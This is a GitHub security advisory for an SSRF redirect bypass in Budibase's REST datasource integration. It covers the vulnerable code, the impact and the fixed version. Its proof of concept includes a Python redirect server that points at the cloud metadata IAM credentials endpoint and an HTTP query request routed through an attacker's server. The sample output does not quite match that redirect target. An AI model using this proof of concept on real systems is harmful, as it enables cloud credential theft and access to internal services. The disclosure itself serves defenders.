# [H] Budibase: SSRF Bypass via HTTP Redirect in REST Datasource Integration

## Summary
Severity: High
Advisory: GHSA-fgqv-jh4g-pvg2
CVE: CVE-2026-45715
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-15
Source: https://github.com/advisories/GHSA-fgqv-jh4g-pvg2
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.38.1

## Details
### Summary

The REST datasource integration follows HTTP redirects without re-checking the IP blacklist, allowing an authenticated Builder to access internal services (cloud metadata, databases) by redirecting through an attacker-controlled server. The same vulnerability class was already patched in automation steps (`fetchWithBlacklist` in `packages/server/src/automations/steps/utils.ts`) but the REST integration was missed.

### Details

**Vulnerable file:** `packages/server/src/integrations/rest.ts`, lines 754-778

The `_req()` method checks the request URL against the IP blacklist at line 754, then calls `fetch(url, input)` at line 778. No `redirect: "manual"` option is set, so undici's fetch defaults to `redirect: "follow"`, automatically following HTTP 301/302/307 redirects **without re-validating the redirect target against the blacklist**.

```typescript
// Line 754 — blacklist check on original URL only
if (await blacklist.isBlacklisted(url)) {
  throw new Error("URL is blocked or could not be resolved safely.")
}

// Line 778 — fetch follows redirects, NO re-check on redirect target
response = await fetch(url, input)
```

The automation steps already implement the correct fix in `packages/server/src/automations/steps/utils.ts` (lines 100-136) via `fetchWithBlacklist()`, which sets `redirect: "manual"` and re-checks the blacklist on every redirect hop. The REST integration does not use this safe wrapper.

Relevant prior fix commits on the automation side:
- `6cfa3bcca3` — "fix(server): enforce outbound blacklist in webhook automation steps"
- `e7d47625be` — "Fix automation webhook blacklist redirect bypass"

### PoC

**Step 1 — Set up a redirect server (attacker-controlled):**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```

**Step 2 — As a Builder, create a REST datasource pointing to the attacker's server.**

**Step 3 — Preview a query:**

```http
POST /api/queries/preview HTTP/1.1
Host: <budibase-instance>
Content-Type: application/json
Cookie: <builder-session>
x-budibase-app-id: <app-id>

{
  "datasourceId": "<rest-datasource-id>",
  "queryVerb": "read",
  "fields": {
    "path": "http://<attacker-ip>:8080/",
    "queryString": "",
    "headers": {},
    "bodyType": "none",
    "requestBody": ""
  },
  "parameters": [],
  "transformer": "return data",
  "name": "ssrf-test",
  "schema": {}
}
```

**Step 4 — The blacklist check passes (attacker IP is public), undici follows the 302 redirect to the internal target, and the response is returned:**

```json
{
  "rows": [{
    "couchdb": "Welcome",
    "version": "3.3.3",
    "uuid": "a84d3353128485a22973a759df2387bc"
  }]
}
```

Tested and confirmed on Budibase v3.34.6 running locally with default blacklist active.

### Impact

- **Cloud credential theft:** On AWS/GCP/Azure instances, attacker accesses `169.254.169.254` to steal IAM credentials or service account tokens.
- **Internal service access:** CouchDB (`:4005`), Redis (`:6379`), MinIO (`:4004`), and other internal services become accessible
- **Bypasses explicit security control:** The IP blacklist exists specifically to prevent this, and works correctly for direct access — only the redirect path is unprotected.
- **Already-known vulnerability class:** This was previously identified and fixed in automation steps (commits `6cfa3bcca3`, `e7d47625be`) but the REST datasource integration was not patched.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-fgqv-jh4g-pvg2
- https://nvd.nist.gov/vuln/detail/CVE-2026-45715
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.38.1
